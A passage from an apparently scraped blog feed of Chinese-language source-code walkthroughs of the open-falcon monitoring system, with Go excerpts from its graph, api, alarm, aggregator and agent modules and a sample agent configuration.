g.InitLog(\"info\") &#125; // init db // 初始化数据库，连接不上失败 g.InitDB() // rrdtool init // rrd初始化 rrdtool.InitChannel() // rrdtool before api for disable loopback connection rrdtool.Start() // start api go api.Start() // start indexing // index更新，定期刷新数据到数据库中 index.Start() // start http server go http.Start() // 定时清理无效数据 go cron.CleanCache() start_signal(os.Getpid(), g.Config())&#125; rrdtool启动，启动协程定时写磁盘数据 1234567891011121314151617func Start() &#123; cfg := g.Config() var err error // check data dir if err = file.EnsureDirRW(cfg.RRD.Storage); err != nil &#123; log.Fatalln(\"rrdtool.Start error, bad data dir \"+cfg.RRD.Storage+\",\", err) &#125; migrate_start(cfg) // sync disk // 写入rdd数据 go syncDisk() // task不同任务刷新 go ioWorker() log.Println(\"rrdtool.Start ok\")&#125; api模块启动 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061func Start() &#123; if !g.Config().Rpc.Enabled &#123; log.Println(\"rpc.Start warning, not enabled\") return &#125; addr := g.Config().Rpc.Listen tcpAddr, err := net.ResolveTCPAddr(\"tcp\", addr) if err != nil &#123; log.Fatalf(\"rpc.Start error, net.ResolveTCPAddr failed, %s\", err) &#125; listener, err := net.ListenTCP(\"tcp\", tcpAddr) if err != nil &#123; log.Fatalf(\"rpc.Start error, listen %s failed, %s\", addr, err) &#125; else &#123; log.Println(\"rpc.Start ok, listening on\", addr) &#125; rpc.Register(new(Graph)) // rpc接口注册 go func() &#123; var tempDelay time.Duration // how long to sleep on accept failure for &#123; conn, err := listener.Accept() if err != nil &#123; if tempDelay == 0 &#123; tempDelay = 5 * time.Millisecond &#125; else &#123; tempDelay *= 2 &#125; if max := 1 * time.Second; tempDelay &gt; max &#123; tempDelay = max &#125; time.Sleep(tempDelay) continue &#125; tempDelay = 0 go func() &#123; e := connects.insert(conn) defer connects.remove(e) rpc.ServeConn(conn) &#125;() &#125; &#125;() select &#123; case &lt;-Close_chan: log.Println(\"rpc, recv sigout and exiting...\") listener.Close() Close_done_chan &lt;- 1 connects.Lock() for e := connects.list.Front(); e != nil; e = e.Next() &#123; e.Value.(net.Conn).Close() &#125; connects.Unlock() return &#125;&#125; 接下来初始化内存索引信息： 12345func Start() &#123; InitCache() //初始化缓存cache统计信息 go StartIndexUpdateIncrTask() //更新索引任务 log.Debug(\"index.Start ok\")&#125; 1234567891011121314// 启动索引的 异步、增量更新 任务, 每隔一定时间，刷新cache中的数据到数据库中func StartIndexUpdateIncrTask() &#123; for &#123; time.Sleep(IndexUpdateIncrTaskSleepInterval) startTs := time.Now().Unix() cnt := updateIndexIncr() endTs := time.Now().Unix() // statistics proc.IndexUpdateIncrCnt.SetCnt(int64(cnt)) proc.IndexUpdateIncr.Incr() proc.IndexUpdateIncr.PutOther(\"lastStartTs\", ntime.FormatTs(startTs)) proc.IndexUpdateIncr.PutOther(\"lastTimeConsumingInSec\", endTs-startTs) &#125;&#125; 主要针对一些收集到的指标数据更新到数据库中。方便后续查询和报警使用： 1234567891011121314151617181920212223242526272829303132333435// 进行一次增量更新func updateIndexIncr() int &#123; ret := 0 if unIndexedItemCache == nil || unIndexedItemCache.Size() &lt;= 0 &#123; return ret &#125; dbConn, err := g.GetDbConn(\"UpdateIndexIncrTask\") if err != nil &#123; log.Error(\"[ERROR] get dbConn fail\", err) return ret &#125; keys := unIndexedItemCache.Keys() for _, key := range keys &#123; icitem := unIndexedItemCache.Get(key) unIndexedItemCache.Remove(key) if icitem != nil &#123; // 并发更新mysql semaUpdateIndexIncr.Acquire() go func(key string, icitem *IndexCacheItem, dbConn *sql.DB) &#123; defer semaUpdateIndexIncr.Release() err := updateIndexFromOneItem(icitem.Item, dbConn) // 更新数据到数据库 if err != nil &#123; proc.IndexUpdateIncrErrorCnt.Incr() &#125; else &#123; IndexedItemCache.Put(key, icitem) &#125; &#125;(key, icitem.(*IndexCacheItem), dbConn) ret++ &#125; &#125; return ret&#125; http服务启动 12345678910111213141516171819202122232425262728293031323334353637383940414243func Start() &#123; if !g.Config().Http.Enabled &#123; log.Println(\"http.Start warning, not enabled\") return &#125; if !g.Config().Debug &#123; gin.SetMode(gin.ReleaseMode) &#125; router = gin.Default() configCommonRoutes() configProcRoutes() configIndexRoutes() router.GET(\"/api/v2/counter/migrate\", func(c *gin.Context) &#123; counter := rrdtool.GetCounterV2() log.Debug(\"migrating counter v2:\", fmt.Sprintf(\"%+v\", counter)) c.JSON(200, counter) &#125;) //compatible with open-falcon v0.1 router.GET(\"/counter/migrate\", func(c *gin.Context) &#123; cnt := rrdtool.GetCounter() log.Debug(\"migrating counter:\", cnt) c.JSON(200, gin.H&#123;\"msg\": \"ok\", \"counter\": cnt&#125;) &#125;) addr := g.Config().Http.Listen if addr == \"\" &#123; return &#125; go router.Run(addr) select &#123; case &lt;-Close_chan: log.Info(\"http recv sigout and exit...\") Close_done_chan &lt;- 1 return &#125;&#125; 定时清理无效数据 12345678910func CleanCache() &#123; ticker := time.NewTicker(time.Duration(g.CLEAN_CACHE) * time.Second) defer ticker.Stop() for &#123; &lt;-ticker.C DeleteInvalidItems() // 删除无效的GraphItems DeleteInvalidHistory() // 删除无效的HistoryCache &#125;&#125; 接下来还是看下graph是如何存储数据的： 接收数据函数是在handleItem函数中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354func handleItems(items []*cmodel.GraphItem) &#123; if items == nil &#123; return &#125; count := len(items) if count == 0 &#123; return &#125; cfg := g.Config() for i := 0; i &lt; count; i++ &#123; if items[i] == nil &#123; continue &#125; endpoint := items[i].Endpoint if !g.IsValidString(endpoint) &#123; log.Debugf(\"invalid endpoint: %s\", endpoint) pfc.Meter(\"invalidEnpoint\", 1) continue &#125; counter := cutils.Counter(items[i].Metric, items[i].Tags) if !g.IsValidString(counter) &#123; log.Debugf(\"invalid counter: %s/%s\", endpoint, counter) pfc.Meter(\"invalidCounter\", 1) continue &#125; dsType := items[i].DsType step := items[i].Step checksum := items[i].Checksum() key := g.FormRrdCacheKey(checksum, dsType, step) //statistics proc.GraphRpcRecvCnt.Incr() // To Graph first := store.GraphItems.First(key) if first != nil &amp;&amp; items[i].Timestamp &lt;= first.Timestamp &#123; continue &#125; // 放入缓存队列 store.GraphItems.PushFront(key, items[i], checksum, cfg) // To Index index.ReceiveItem(items[i], checksum) // To History store.AddItem(checksum, items[i]) &#125;&#125; 接收到数据先放到缓存队列，然后写入rrd磁盘或者写入到数据库中完成存档。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon api 源码分析","slug":"api源码分析","date":"2020-01-21T09:07:43.700Z","updated":"2020-01-21T09:05:48.000Z","comments":true,"path":"2020/01/21/api源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/api%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon api源码分析主流程在module/api/main 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071func main() &#123; config.BinaryName = BinaryName config.Version = Version config.GitCommit = GitCommit cfgTmp := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") help := flag.Bool(\"h\", false, \"help\") flag.Parse() cfg := *cfgTmp if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; if *help &#123; flag.Usage() os.Exit(0) &#125; viper.AddConfigPath(\".\") viper.AddConfigPath(\"/\") viper.AddConfigPath(\"./config\") viper.AddConfigPath(\"./api/config\") cfg = strings.Replace(cfg, \".json\", \"\", 1) viper.SetConfigName(cfg) err := viper.ReadInConfig() if err != nil &#123; log.Fatal(err) &#125; // 日志初始化 err = config.InitLog(viper.GetString(\"log_level\")) if err != nil &#123; log.Fatal(err) &#125; //初始化数据 err = config.InitDB(viper.GetBool(\"db.db_bug\"), viper.GetViper()) if err != nil &#123; log.Fatalf(\"db conn failed with error %s\", err.Error()) &#125; if viper.GetString(\"log_level\") != \"debug\" &#123; gin.SetMode(gin.ReleaseMode) &#125; // gin初始化 routes := gin.Default() if viper.GetBool(\"gen_doc\") &#123; yaag.Init(&amp;yaag.Config&#123; On: true, DocTitle: \"Gin\", DocPath: viper.GetString(\"gen_doc_path\"), BaseUrls: map[string]string&#123;\"Production\": \"/api/v1\", \"Staging\": \"/api/v1\"&#125;, &#125;) routes.Use(yaag_gin.Document()) &#125; //启动graph服务，启动服务一致性hash initGraph() //start gin server log.Debugf(\"will start with port:%v\", viper.GetString(\"web_port\")) go controller.StartGin(viper.GetString(\"web_port\"), routes) sigs := make(chan os.Signal, 1) signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM) go func() &#123; &lt;-sigs fmt.Println() os.Exit(0) &#125;() select &#123;&#125;&#125; initGraph函数中启动graph服务 1234567891011121314151617func Start(addrs map[string]string) &#123; clusterMap = addrs connTimeout = int32(viper.GetInt(\"graphs.conn_timeout\")) callTimeout = int32(viper.GetInt(\"graphs.call_timeout\")) for c := range clusterMap &#123; gcluster = append(gcluster, c) &#125; defer func() &#123; if r := recover(); r != nil &#123; log.Errorf(\"graph got painc:%v\", r) Start(clusterMap) &#125; &#125;() initNodeRings(clusterMap) //初始化一致性hash initConnPools(clusterMap) //初始化rpc连接池 log.Println(\"graph.Start ok\")&#125; StartGin注册路由并启动： 1234567891011121314151617func StartGin(port string, r *gin.Engine) &#123; r.Use(utils.CORS()) r.GET(\"/\", func(c *gin.Context) &#123; c.String(http.StatusOK, \"Hello, I'm Falcon+ (｡A｡)\") &#125;) graph.Routes(r) uic.Routes(r) template.Routes(r) strategy.Routes(r) host.Routes(r) expression.Routes(r) mockcfg.Routes(r) dashboard_graph.Routes(r) dashboard_screen.Routes(r) alarm.Routes(r) r.Run(port)&#125; 这边api主要是在gin中注册信息，提供增删改查的功能，具体可能需要仔细去看下了。详细的这边就不描述了。","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon alarm 源码分析","slug":"alarm源码分析","date":"2020-01-21T09:07:42.964Z","updated":"2020-01-21T09:04:29.000Z","comments":true,"path":"2020/01/21/alarm源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/alarm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon alarm 源码分析主函数在modules/alarm/main中 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") help := flag.Bool(\"h\", false, \"help\") flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; if *help &#123; flag.Usage() os.Exit(0) &#125; g.ParseConfig(*cfg) g.InitLog(g.Config().LogLevel) if g.Config().LogLevel != \"debug\" &#123; gin.SetMode(gin.ReleaseMode) &#125; //初始化redis连接池 g.InitRedisConnPool() // 初始化数据库 model.InitDatabase() // 启动定时发送channel cron.InitSenderWorker() // 启动http服务 go http.Start() // 定时读取highevent go cron.ReadHighEvent() // 定时读取lowevent go cron.ReadLowEvent() // 组装Mail信息，群发功能 go cron.CombineSms() go cron.CombineMail() go cron.CombineIM() // 发送邮件功能 go cron.ConsumeIM() go cron.ConsumeSms() go cron.ConsumeMail() // 清理过期事件 go cron.CleanExpiredEvent() sigs := make(chan os.Signal, 1) signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM) go func() &#123; &lt;-sigs fmt.Println() g.RedisConnPool.Close() os.Exit(0) &#125;() select &#123;&#125;&#125; 事件读取任务以highevent为例子： 123456789101112131415161718func ReadHighEvent() &#123; // 获取优先级高的队列 queues := g.Config().Redis.HighQueues if len(queues) == 0 &#123; return &#125; for &#123; // 出队 event, err := popEvent(queues) if err != nil &#123; time.Sleep(time.Second) continue &#125; // 消费队列 consume(event, true) &#125;&#125; 123456789101112131415161718192021func consume(event *cmodel.Event, isHigh bool) &#123; actionId := event.ActionId() if actionId &lt;= 0 &#123; return &#125; action := api.GetAction(actionId) if action == nil &#123; return &#125; if action.Callback == 1 &#123; HandleCallback(event, action) &#125; if isHigh &#123; consumeHighEvents(event, action) &#125; else &#123; consumeLowEvents(event, action) &#125;&#125; consumeHighEvents函数最终会调用WriteMaiModel函数最终写入到redis队列中去： 1234567891011121314func WriteMailModel(mail *model.Mail) &#123; if mail == nil &#123; return &#125; bs, err := json.Marshal(mail) if err != nil &#123; log.Error(err) return &#125; log.Debugf(\"write mail to queue, mail:%v, queue:%s\", mail, MAIL_QUEUE_NAME) lpush(MAIL_QUEUE_NAME, string(bs))&#125; 123456789101112131415161718192021222324252627282930313233343536func combineMail() &#123; dtos := popAllMailDto() count := len(dtos) if count == 0 &#123; return &#125; dtoMap := make(map[string][]*MailDto) for i := 0; i &lt; count; i++ &#123; key := fmt.Sprintf(\"%d%s%s%s\", dtos[i].Priority, dtos[i].Status, dtos[i].Email, dtos[i].Metric) if _, ok := dtoMap[key]; ok &#123; dtoMap[key] = append(dtoMap[key], dtos[i]) &#125; else &#123; dtoMap[key] = []*MailDto&#123;dtos[i]&#125; &#125; &#125; // 不要在这处理，继续写回redis，否则重启alarm很容易丢数据 for _, arr := range dtoMap &#123; size := len(arr) if size == 1 &#123; redi.WriteMail([]string&#123;arr[0].Email&#125;, arr[0].Subject, arr[0].Content) continue &#125; subject := fmt.Sprintf(\"[P%d][%s] %d %s\", arr[0].Priority, arr[0].Status, size, arr[0].Metric) contentArr := make([]string, size) for i := 0; i &lt; size; i++ &#123; contentArr[i] = arr[i].Content &#125; content := strings.Join(contentArr, \"\\r\\n\") log.Debugf(\"combined mail subject:%s, content:%s\", subject, content) redi.WriteMail([]string&#123;arr[0].Email&#125;, subject, content) &#125;&#125; 设置以天为单位的过期删除事件，数据库中删除。 12345678910111213func CleanExpiredEvent() &#123; for &#123; retention_days := g.Config().Housekeeper.EventRetentionDays delete_batch := g.Config().Housekeeper.EventDeleteBatch now := time.Now() before := now.Add(time.Duration(-retention_days*24) * time.Hour) eventmodel.DeleteEventOlder(before, delete_batch) time.Sleep(time.Second * 60) &#125;&#125;","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon aggregator源码分析","slug":"aggregator源码分析","date":"2020-01-21T09:07:42.242Z","updated":"2020-01-21T09:03:58.000Z","comments":true,"path":"2020/01/21/aggregator源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/aggregator%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon aggregator源码分析 主流程module/aggregator/main中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") help := flag.Bool(\"h\", false, \"help\") flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; if *help &#123; flag.Usage() os.Exit(0) &#125; // 配置文件解析 g.ParseConfig(*cfg) // 数据库初始化 db.Init() // http服务启动，接口查询所有的cluster信息 go http.Start() //定时更新cluster数据，并启动worker启动，用于计算平均指标数据 go cron.UpdateItems() // sdk configuration sender.Debug = g.Config().Debug sender.PostPushUrl = g.Config().Api.PushApi // 数据推送 sender.StartSender() sigs := make(chan os.Signal, 1) signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM) go func() &#123; &lt;-sigs fmt.Println() os.Exit(0) &#125;() select &#123;&#125;&#125; 主要功能在UpdateItems函数中： 123456789func updateItems() &#123; items, err := db.ReadClusterMonitorItems() if err != nil &#123; return &#125; deleteNoUseWorker(items) createWorkerIfNeed(items)&#125; 首先查询数据库ReadClusterMonitorItems，获取已经在监控中的集群信息。，然后删除没有用到的集群信息。 12345678910111213func deleteNoUseWorker(m map[string]*g.Cluster) &#123; del := []string&#123;&#125; for key, worker := range Workers &#123; if _, ok := m[key]; !ok &#123; worker.Drop() del = append(del, key) &#125; &#125; for _, key := range del &#123; delete(Workers, key) &#125;&#125; 如果还没有监控则创建worker任务： 12345678910111213func createWorkerIfNeed(m map[string]*g.Cluster) &#123; for key, item := range m &#123; if _, ok := Workers[key]; !ok &#123; if item.Step &lt;= 0 &#123; log.Println(\"[W] invalid cluster(step &lt;= 0):\", item) continue &#125; worker := NewWorker(item) Workers[key] = worker worker.Start() // 启动 &#125; &#125;&#125; 123456789101112131415161718192021222324252627func (this Worker) Start() &#123; go func() &#123; s1 := rand.NewSource(time.Now().UnixNano() * this.ClusterItem.Id) r1 := rand.New(s1) // 60s, step usually delay := r1.Int63n(60000) if g.Config().Debug &#123; log.Printf(\"[I] after %5d ms, start worker %d\", delay, this.ClusterItem.Id) &#125; time.Sleep(time.Duration(delay) * time.Millisecond) this.Ticker = time.NewTicker(time.Duration(this.ClusterItem.Step) * time.Second) for &#123; select &#123; case &lt;-this.Ticker.C: WorkerRun(this.ClusterItem) case &lt;-this.Quit: if g.Config().Debug &#123; log.Println(\"[I] drop worker\", this.ClusterItem) &#125; this.Ticker.Stop() return &#125; &#125; &#125;()&#125; 设置定时器执行函数WorkerRun 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125func WorkerRun(item *g.Cluster) &#123; debug := g.Config().Debug numeratorStr := cleanParam(item.Numerator) // denominatorStr := cleanParam(item.Denominator) if !expressionValid(numeratorStr) || !expressionValid(denominatorStr) &#123; log.Println(\"[W] invalid numerator or denominator\", item) return &#125; // 判断包含$(需要解析 needComputeNumerator := needCompute(numeratorStr) needComputeDenominator := needCompute(denominatorStr) if !needComputeNumerator &amp;&amp; !needComputeDenominator &#123; log.Println(\"[W] no need compute\", item) return &#125; // 解析算子 numeratorOperands, numeratorOperators, numeratorComputeMode := parse(numeratorStr, needComputeNumerator) denominatorOperands, denominatorOperators, denominatorComputeMode := parse(denominatorStr, needComputeDenominator) // 操作非法 if !operatorsValid(numeratorOperators) || !operatorsValid(denominatorOperators) &#123; log.Println(\"[W] operators invalid\", item) return &#125; // 根据id获取hostname hostnames, err := sdk.HostnamesByID(item.GroupId) if err != nil || len(hostnames) == 0 &#123; return &#125; now := time.Now().Unix() // 获取最新的数据点 valueMap, err := queryCounterLast(numeratorOperands, denominatorOperands, hostnames, now-int64(item.Step*2), now) if err != nil &#123; log.Println(\"[E]\", err, item) return &#125; var numerator, denominator float64 var validCount int // 每个机器计算 for _, hostname := range hostnames &#123; var numeratorVal, denominatorVal float64 var err error // 需要计算分子 if needComputeNumerator &#123; numeratorVal, err = compute(numeratorOperands, numeratorOperators, numeratorComputeMode, hostname, valueMap) if debug &amp;&amp; err != nil &#123; log.Printf(\"[W] [hostname:%s] [numerator:%s] id:%d, err:%v\", hostname, item.Numerator, item.Id, err) &#125; else if debug &#123; log.Printf(\"[D] [hostname:%s] [numerator:%s] id:%d, value:%0.4f\", hostname, item.Numerator, item.Id, numeratorVal) &#125; if err != nil &#123; continue &#125; &#125; // 需要计算分母 if needComputeDenominator &#123; denominatorVal, err = compute(denominatorOperands, denominatorOperators, denominatorComputeMode, hostname, valueMap) if debug &amp;&amp; err != nil &#123; log.Printf(\"[W] [hostname:%s] [denominator:%s] id:%d, err:%v\", hostname, item.Denominator, item.Id, err) &#125; else if debug &#123; log.Printf(\"[D] [hostname:%s] [denominator:%s] id:%d, value:%0.4f\", hostname, item.Denominator, item.Id, denominatorVal) &#125; if err != nil &#123; continue &#125; &#125; if debug &#123; log.Printf(\"[D] hostname:%s numerator:%0.4f denominator:%0.4f per:%0.4f\\n\", hostname, numeratorVal, denominatorVal, numeratorVal/denominatorVal) &#125; numerator += numeratorVal denominator += denominatorVal validCount += 1 &#125; // 不需要要计算分子 if !needComputeNumerator &#123; if numeratorStr == \"$#\" &#123; numerator = float64(validCount) &#125; else &#123; numerator, err = strconv.ParseFloat(numeratorStr, 64) if err != nil &#123; log.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", numeratorStr, err, item.Id) return &#125; &#125; &#125; // 不需要计算分母 if !needComputeDenominator &#123; if denominatorStr == \"$#\" &#123; denominator = float64(validCount) &#125; else &#123; denominator, err = strconv.ParseFloat(denominatorStr, 64) if err != nil &#123; log.Printf(\"[E] strconv.ParseFloat(%s) fail %v, id:%d\", denominatorStr, err, item.Id) return &#125; &#125; &#125; if denominator == 0 &#123; log.Println(\"[W] denominator == 0, id:\", item.Id) return &#125; if validCount == 0 &#123; log.Println(\"[W] validCount == 0, id:\", item.Id) return &#125; if debug &#123; log.Printf(\"[D] hostname:all numerator:%0.4f denominator:%0.4f per:%0.4f\\n\", numerator, denominator, numerator/denominator) &#125; // sender push推送集群数据，给agent节点推送数据，数据传输通过/v1/push转发到transfer,这个地方需要注意的！！！ sender.Push(item.Endpoint, item.Metric, item.Tags, numerator/denominator, item.DsType, int64(item.Step))&#125;","categories":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/categories/monitor/"}],"tags":[{"name":"monitor","slug":"monitor","permalink":"http://www.yorzorzy.xyz/tags/monitor/"}]},{"title":"open-falcon agent源码分析","slug":"agent源码分析","date":"2020-01-21T09:07:41.265Z","updated":"2020-01-21T09:06:43.000Z","comments":true,"path":"2020/01/21/agent源码分析/","link":"","permalink":"http://www.yorzorzy.xyz/2020/01/21/agent%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"open-falcon agent源码分析因为工作需要，将这个open-falcon代码逻辑需要整理清楚。有些部分需要定制修改。 本篇文章主要是针对open-falcon 中agent模块进行分析。 主流程再module/agent/module中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556func main() &#123; g.BinaryName = BinaryName g.Version = Version g.GitCommit = GitCommit cfg := flag.String(\"c\", \"cfg.json\", \"configuration file\") version := flag.Bool(\"v\", false, \"show version\") check := flag.Bool(\"check\", false, \"check collector\") //解析参数 flag.Parse() if *version &#123; fmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit) os.Exit(0) &#125; if *check &#123; // 检查当前系统磁盘cpu等信息，有问题就退出 funcs.CheckCollector() os.Exit(0) &#125; //解析配置文件 g.ParseConfig(*cfg) if g.Config().Debug &#123; g.InitLog(\"debug\") &#125; else &#123; g.InitLog(\"info\") &#125; // 初始化root目录 g.InitRootDir() // localip初始化其实就是检查hbs服务是否启动能够连接。同时根据hbs来获取本地ip g.InitLocalIp() // 初始化rpc客户端 g.InitRpcClients() // 构建需要抓取的指标数据 funcs.BuildMappers() // 定时更新cpu和disk状态历史数据 go cron.InitDataHistory() // 定时给hbs报告agent本机状态 cron.ReportAgentStatus() //同步插件，没咋用过 cron.SyncMinePlugins() //调用hbs rpc接口BuiltinMetrics来获取BuiltinMetrics数据。同步监控端口、路径、进程和URL cron.SyncBuiltinMetrics() //定时检查信任ip cron.SyncTrustableIps() //定时收集指标数据 cron.Collect() //启动http接口方便查询 go http.Start() select &#123;&#125;&#125; 先来看下配置文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&#123; \"debug\": true, \"hostname\": \"\", \"ip\": \"\", \"plugin\": &#123; # 插件 \"enabled\": false, \"dir\": \"./plugin\", \"git\": \"https://github.com/open-falcon/plugin.git\", \"logs\": \"./logs\" &#125;, \"heartbeat\": &#123; # 心跳 \"enabled\": true, \"addr\": \"127.0.0.1:6030\", \"interval\": 60, \"timeout\": 1000 &#125;, \"transfer\": &#123; # 传输地址 \"enabled\": true, \"addrs\": [ \"127.0.0.1:8433\", \"127.0.0.1:8433\" ], \"interval\": 60, \"timeout\": 1000 &#125;, \"http\": &#123; # http \"enabled\": true, \"listen\": \":1988\", \"backdoor\": false &#125;, \"collector\": &#123; # 收集接口数据 \"ifacePrefix\": [\"eth\", \"em\"], \"mountPoint\": [] &#125;, \"default_tags\": &#123; &#125;, \"ignore\": &#123; \"cpu.busy\": true, \"df.bytes.free\": true, \"df.bytes.total\": true, \"df.bytes.used\": true, \"df.bytes.used.percent\": true, \"df.inodes.total\": true, \"df.inodes.free\": true, \"df.inodes.used\": true, \"df.inodes.used.percent\": true, \"mem.memtotal\": true, \"mem.memused\": true, \"mem.memused.percent\": true, \"mem.memfree\": true, \"mem.swaptotal\": true, \"mem.swapused\": true, \"mem.swapfree\": true &#125;&#125; 先来看看InitRootDir函数，主要获取了根目录，为了后续启动http拼接路径。 1234567func InitRootDir() &#123; var err error Root, err = os.Getwd() if err != nil &#123; log.Fatalln(\"getwd fail:\", err) &#125;&#125; 获取函数InitLocalIp，该函数获取hbs连接。获取本地localip地址，主要为了能够后续给hbs发送心跳报告。 12345678910111213func InitLocalIp() &#123; if Config().Heartbeat.Enabled &#123; conn, err := net.DialTimeout(\"tcp\", Config().Heartbeat.Addr, time.Second*10) if err != nil &#123; log.Println(\"get local addr failed !\") &#125; else &#123; LocalIp = strings.Split(conn.LocalAddr().String(), \":\")[0] conn.Close() &#125; &#125; else &#123; log.Println(\"hearbeat is not enabled, can't get localip\") &#125;&#125; 初始化hbs的rpc客户端连接： 12345678func InitRpcClients() &#123; if Config().Heartbeat.Enabled &#123; HbsClient = &amp;SingleConnRpcClient&#123; RpcServer: Config().Heartbeat.Addr, Timeout: time.Duration(Config().Heartbeat.Timeout) * time.Millisecond, &#125; &#125;&#125; 函数BuildMappers，构建指标函数，类似于将所有的指标函数注册到map中去。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152func BuildMappers() &#123; interval := g.Config().Transfer.Interval Mappers = []FuncsAndInterval&#123; &#123; Fs: []func() []*model.MetricValue&#123; AgentMetrics, CpuMetrics, NetMetrics, KernelMetrics, LoadAvgMetrics, MemMetrics, DiskIOMetrics, IOStatsMetrics, NetstatMetrics, ProcMetrics, UdpMetrics, &#125;, Interval: interval, &#125;, &#123; Fs: []func() []*model.MetricValue&#123; DeviceMetrics, &#125;, Interval: interval, &#125;, &#123; Fs: []func() []*model.MetricValue&#123; PortMetrics, SocketStatSummaryMetrics, &#125;, Interval: interval, &#125;, &#123; Fs: []func() []*model.MetricValue&#123; DuMetrics, &#125;, Interval: interval, &#125;, &#123; Fs: []func() []*model.MetricValue&#123; UrlMetrics, &#125;, Interval: interval, &#125;, &#123; Fs: []func() []*model.MetricValue&#123; GpuMetrics, &#125;, Interval: interval, &#125;, &#125;&#125; 函数InitDataHistory： 1234567func InitDataHistory() &#123; for &#123; funcs.UpdateCpuStat() //更新cpu状态信息 方便后续统计的时候用到了。 funcs.UpdateDiskStats() // 更新disk状态信息 time.Sleep(g.COLLECT_INTERVAL) // 间隔 &#125;&#125; 函数reportAgentStatus函数： 12345func ReportAgentStatus() &#123; if g.Config().Heartbeat.Enabled &amp;&amp; g.Config().Heartbeat.Addr != \"\" &#123; go reportAgentStatus(time.Duration(g.Config().Heartbeat.Interval) * time.Second) &#125;&#125; ReportAgentStatus函数调用reportAgentStatus函数来类似做了一层公共方法转私有分封装： 123456789101112131415161718192021222324func reportAgentStatus(interval time.Duration) &#123; for &#123; hostname, err := g.Hostname() if err != nil &#123; hostname = fmt.Sprintf(\"error:%s\", err.Error()) &#125; req := model.AgentReportRequest&#123; Hostname: hostname, IP: g.IP(), AgentVersion: g.VersionMsg(), PluginVersion: g.GetCurrPluginVersion(), &#125; var resp model.SimpleRpcResponse // 调用hbs rpc接口reportStatus上传当前agent状态信息，问题如果agent节点挂了，那么后续可能是通过mock数据去检查了 err = g.HbsClient.Call(\"Agent.ReportStatus\", req, &amp;resp) if err != nil || resp.Code != 0 &#123; log.Println(\"call Agent.ReportStatus fail:\", err, \"Request:\", req, \"Response:\", resp) &#125; time.Sleep(interval) &#125;&#125; 类似的SyncMinPlugins函数： 123456789101112131415func SyncMinePlugins() &#123; if !g.Config().Plugin.Enabled &#123; return &#125; if !g.Config().Heartbeat.Enabled &#123; return &#125; if g.Config().Heartbeat.Addr == \"\" &#123; return &#125; go syncMinePlugins()&#125; 调用函数syncMinePlugins： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111func syncMinePlugins() &#123; var ( timestamp int64 = -1 pluginDirs []string ) duration := time.Duration(g.Config().Heartbeat.Interval) * time.Second for &#123; time.Sleep(duration) hostname, err := g.Hostname() if err != nil &#123; continue &#125; req := model.AgentHeartbeatRequest&#123; Hostname: hostname, &#125; var resp model.AgentPluginsResponse // hbs rpc接口MinePlugins，用来获取MinePlugin插件信息 err = g.HbsClient.Call(\"Agent.MinePlugins\", req, &amp;resp) if err != nil &#123; log.Println(\"call Agent.MinePlugin fail:\", err) continue &#125; if resp.Timestamp &lt;= timestamp &#123; continue &#125; pluginDirs = resp.Plugins timestamp = resp.Timestamp // 后续就是根据获取的插件信息目录等，启动相关的插件脚本，如果有自定义的插件需要抓取数据等，其实可以再这边写。 if g.Config().Debug &#123; log.Printf(\"call Agent.MinePlugin:%v\\n\", resp) &#125; if len(pluginDirs) == 0 &#123; plugins.ClearAllPlugins() continue &#125; desiredAll := make(map[string]*plugins.Plugin) 